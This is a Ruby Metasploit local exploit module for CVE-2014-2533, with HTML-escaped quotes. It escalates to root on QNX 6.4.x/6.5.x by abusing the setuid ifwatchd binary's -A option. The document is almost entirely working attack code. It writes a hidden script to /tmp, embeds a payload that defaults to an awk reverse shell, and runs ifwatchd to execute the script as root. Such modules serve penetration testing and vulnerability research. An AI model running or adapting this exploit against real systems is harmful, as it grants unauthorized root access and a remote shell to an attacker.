# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ifwatchd Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on QNX 6.4.x and 6.5.x
        systems by exploiting the ifwatchd suid executable.

        ifwatchd allows users to specify scripts to execute using the &#039;-A&#039;
        command line argument; however, it does not drop privileges when
        executing user-supplied scripts, resulting in execution of arbitrary
        commands as root.

        This module has been tested successfully on QNX Neutrino 6.5.0 (x86)
        and 6.5.0 SP1 (x86).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;cenobyte&#039;,     # Discovery and exploit
          &#039;Tim Brown&#039;,    # Independent discovery
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-2533&#039;],
          [&#039;BID&#039;, &#039;66449&#039;],
          [&#039;EDB&#039;, &#039;32153&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/bugtraq/2014/Mar/66&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 10 2014&#039;,
      &#039;Platform&#039;       => &#039;unix&#039;, # QNX
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => &#039;&#039;,
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 1024,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;gawk generic&#039;
            }
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 10,
          &#039;PAYLOAD&#039;  => &#039;cmd/unix/reverse_awk&#039;
        }
    ))
    register_advanced_options [
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def ifwatchd_path
    &#039;/sbin/ifwatchd&#039;
  end

  def base_dir
    datastore[&#039;WritableDir&#039;]
  end

  def check
    unless setuid? ifwatchd_path
      vprint_error "#{ifwatchd_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{ifwatchd_path} is setuid"

    CheckCode::Detected
  end

  def exploit
    unless check == CheckCode::Detected
      fail_with Failure::NotVulnerable, &#039;Target not vulnerable&#039;
    end

    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    script_path = "#{base_dir}/.#{rand_text_alphanumeric 10..15}"

    print_status &#039;Writing interface arrival event script...&#039;
    cmd_exec "echo &#039;#!/bin/sh&#039; > #{script_path}"
    cmd_exec "echo &#039;PATH=/bin:/usr/bin&#039; >> #{script_path}"
    cmd_exec "echo &#039;IFWPID=$(ps -edaf | grep \"#{script_path}\" | awk \"!/grep/ { print $2 }\")&#039; >> #{script_path}"
    exp = payload.encoded.gsub(&#039;"&#039;, &#039;\"&#039;).gsub(&#039;$&#039;, &#039;\$&#039;)
    cmd_exec "echo \"#{exp}\" >> #{script_path}"
    cmd_exec "echo &#039;kill -9 $IFWPID&#039; >> #{script_path}"
    register_file_for_cleanup script_path

    cmd_exec "chmod +x &#039;#{script_path}&#039;"

    print_status "Executing #{ifwatchd_path}..."
    interface = &#039;lo0&#039;
    cmd_exec "#{ifwatchd_path} -A &#039;#{script_path}&#039; -v #{interface} >/dev/null & echo "
  end
end

